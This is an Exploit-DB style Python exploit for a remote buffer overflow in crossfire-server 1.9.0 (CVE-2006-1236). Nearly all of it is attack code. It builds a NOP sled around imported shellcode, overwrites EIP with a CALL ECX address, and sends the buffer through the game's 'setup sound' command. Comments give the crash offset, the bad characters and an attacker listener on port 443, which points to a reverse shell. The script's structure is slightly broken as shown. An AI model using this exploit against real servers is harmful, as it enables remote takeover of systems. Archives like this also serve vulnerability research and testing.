# Exploit Title: crossfire-server 1.9.0 - 'SetUp()' Remote Buffer Overflow
# Exploit Author: Khaled Salem @Khaled0x07
# Software Link: https://www.exploit-db.com/apps/43240af83a4414d2dcc19fff3af31a63-crossfire-1.9.0.tar.gz
# Version: 1.9.0
# Tested on: Kali Linux 2020.4
# CVE : CVE-2006-1236

#!/bin/python
import socket, sys

from time import sleep
from base64 import b64encode
from payload import buf
import socket
import socket, sys
import struct

def shell_attack(target_machine, target_port):



# Crash at 4379
# EIP Offset at 4368
# Badchar \x00\x20
# ECX Size 170
# CALL ECX 0x080640eb

	size = 4379

	# Attacker IP: 127.0.0.1 Port: 443
	try:
		filler = b"\x90"*(4368 - 170) + buf+b"\x90"*(170-len(buf))
		EIP = b"\xeb\x40\x06\x08" 
		padding = b"C" * (4379 - len(filler) - len(EIP))
		payload = filler + EIP + padding
		inputBuffer = b"\x11(setup sound "+ payload +b"\x90\x00#"
		
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect((target_machine,target_port)) # Server IP Address: 192.168.1.4
	

		s.send(inputBuffer)
		s.close()

	except:
		pass